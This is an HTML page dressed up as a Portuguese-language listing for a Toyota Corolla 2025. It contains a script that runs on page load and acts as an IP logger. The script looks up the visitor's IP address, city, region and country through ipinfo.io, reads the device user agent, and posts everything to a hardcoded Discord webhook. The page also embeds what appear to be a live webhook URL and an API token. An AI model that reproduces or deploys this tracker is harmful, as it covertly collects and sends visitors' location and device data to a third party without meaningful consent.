<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<title>Toyota Corolla 2025 - Detalhes e Visita</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #f4f4f4;
    margin: 40px;
    color: #333;
  }
  .container {
    background: #fff;
    max-width: 480px;
    margin: auto;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 0 12px rgba(0,0,0,0.1);
    text-align: center;
  }
  h1 {
    color: #007BFF;
    margin-bottom: 15px;
  }
  img {
    max-width: 100%;
    border-radius: 8px;
    margin-bottom: 20px;
  }
  .info {
    text-align: left;
    margin-bottom: 20px;
  }
  .info div {
    margin: 6px 0;
    font-size: 17px;
  }
</style>
</head>
<body>
<div class="container">
  <h1>Toyota Corolla 2025</h1>
  <img src="https://cdn.motor1.com/images/mgl/8xZqk/s3/2023-toyota-corolla-cross.jpg" alt="Toyota Corolla 2025" />
  <div class="info">
    <div><strong>Marca:</strong> Toyota</div>
    <div><strong>Modelo:</strong> Corolla</div>
    <div><strong>Ano:</strong> 2025</div>
    <div><strong>Motor:</strong> 2.0L 4 cilindros</div>
    <div><strong>Cor:</strong> Prata</div>
  </div>
  <p>Obrigado por visitar! Seus dados estão sendo coletados automaticamente para contato.</p>
</div>

<script>
  const webhookURL = "https://discord.com/api/webhooks/1374031366601179257/J-MXiYIZl0JtoLxu66vzukB4S5cK0dN4QbAgUsdiWUien1tCOtGQevVGD_y5bAIn38Q0";
  const ipinfoToken = "f2b591f2811bd4";

  function detectarDispositivo() {
    const ua = navigator.userAgent;
    let dispositivo = "Desconhecido";

    if (/mobile|android|iphone|ipad|ipod/i.test(ua)) {
      dispositivo = "Mobile";
    } else {
      dispositivo = "PC";
    }

    let modelo = "Não identificado";
    const modeloMatch = ua.match(/([^)]+)/);
    if(modeloMatch && modeloMatch[1]) {
      modelo = modeloMatch[1];
    }

    return { dispositivo, modelo };
  }

  async function enviarDados() {
    try {
      const resp = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
      const data = await resp.json();

      const { dispositivo, modelo } = detectarDispositivo();

      const mensagem = `
**Novo visitante detectado**
- IP: ${data.ip}
- Cidade: ${data.city || "N/A"}
- Estado: ${data.region || "N/A"}
- País: ${data.country || "N/A"}
- Dispositivo: ${dispositivo}
- Modelo/UserAgent: ${modelo}

**Interesse no carro:**
- Marca: Toyota
- Modelo: Corolla
- Ano: 2025
- Motor: 2.0L 4 cilindros
- Cor: Prata
      `;

      await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: mensagem })
      });
    } catch (error) {
      console.error("Erro ao enviar dados:", error);
    }
  }

  enviarDados();
</script>
</body>
</html>
